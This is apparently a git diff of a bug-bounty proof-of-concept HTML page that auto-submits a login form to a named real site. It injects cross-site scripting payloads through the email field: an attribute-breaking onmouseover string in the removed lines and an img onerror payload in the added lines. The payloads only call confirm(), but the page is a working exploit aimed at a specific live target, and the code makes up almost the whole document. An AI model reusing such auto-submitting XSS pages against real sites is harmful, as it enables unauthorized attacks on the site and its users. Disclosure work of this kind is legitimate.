@@ -3,14 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <title>Exploit</title>
-</head>
-<body>
-    <form id="exploitForm" action="https://classmgmt.com/login.php" method="POST">
-        <input type="hidden" name="email" value="%22onmouseover%3D%22confirm%28%27OPENBUGBOUNTY%27%29">
-        <input type="hidden" name="password" value="password">
-    </form>
     <script>
-        document.getElementById('exploitForm').submit();
+        // Function to handle form submission with a delay
+        function submitForm() {
+            var form = document.getElementById('exploitForm');
+            // Create a valid email and password for initial submission
+            var email = form.elements['email'];
+            var password = form.elements['password'];
+
+            // Set valid credentials
+            email.value = 'valid.email@example.com'; // Replace with a valid email
+            password.value = 'password'; // Replace with a valid password
+            
+            // Submit the form
+            form.submit();
+
+            // Set a timeout to wait for the initial submission to process
+            setTimeout(function() {
+                // Change the email field to the XSS payload
+                email.value = '"><img src=x onerror=confirm("OPENBUGBOUNTY")>';
+                // Submit the form again with the XSS payload
+                form.submit();
+            }, 2000); // Adjust the timeout as needed
+        }
     </script>
+</head>
+<body onload="submitForm()">
+    <form id="exploitForm" action="https://classmgmt.com/login.php" method="POST">
+        <input type="hidden" name="email" value="">
+        <input type="hidden" name="password" value="">
+    </form>
 </body>
 </html>
+
